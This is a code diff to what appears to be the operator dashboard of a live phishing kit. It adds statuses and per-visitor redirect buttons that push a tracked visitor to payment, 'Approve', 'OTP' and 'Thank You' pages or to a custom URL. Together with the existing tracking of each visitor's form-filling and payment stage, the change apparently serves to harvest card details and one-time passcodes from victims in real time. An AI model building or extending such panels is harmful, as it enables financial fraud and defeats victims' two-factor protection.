@@ -184,7 +184,8 @@ function statusBadge(v) {
     const m = {
         'viewing':['b-viewing','Viewing'], 'filling_form':['b-filling','Filling Form'],
         'reading_policies':['b-reading','Reading Policies'], 'registered':['b-registered','Registered'],
-        'waiting':['b-waiting','Waiting'], 'exam':['b-exam','In Exam'], 'payment':['b-payment','Payment']
+        'waiting':['b-waiting','Waiting'], 'exam':['b-exam','In Exam'], 'payment':['b-payment','Payment'],
+        'approve':['b-exam','Approving'], 'otp':['b-reading','OTP Page'], 'thankyou':['b-registered','Thank You']
     };
     const [c,t] = m[v.status]||['b-viewing','Viewing'];
     return `<span class="badge-sm ${c}">${t}</span>`;
@@ -330,7 +331,10 @@ function buildInner(v) {
         </div>
         <div class="vw-redirect-panel" id="redir-${v.id}">
             <div class="vw-redirect-options">
-                <button class="vw-redir-btn" onclick="doRedirect(${v.id},'payment.php')">Payment Page</button>
+                <button class="vw-redir-btn" onclick="doRedirect(${v.id},'payment.php')">Payment</button>
+                <button class="vw-redir-btn" onclick="doRedirect(${v.id},'approve.php')">Approve</button>
+                <button class="vw-redir-btn" onclick="doRedirect(${v.id},'otp.php')">OTP</button>
+                <button class="vw-redir-btn" onclick="doRedirect(${v.id},'thankyou.php')">Thank You</button>
                 <button class="vw-redir-btn" onclick="doRedirect(${v.id},'waiting.php')">Waiting Room</button>
                 <input type="text" id="custom-url-${v.id}" placeholder="Custom URL..." style="padding:6px 10px;border:1.5px solid var(--border);border-radius:8px;font-size:.78rem;flex:1;min-width:120px">
                 <button class="vw-redir-btn" onclick="doCustomRedirect(${v.id})">Send</button>
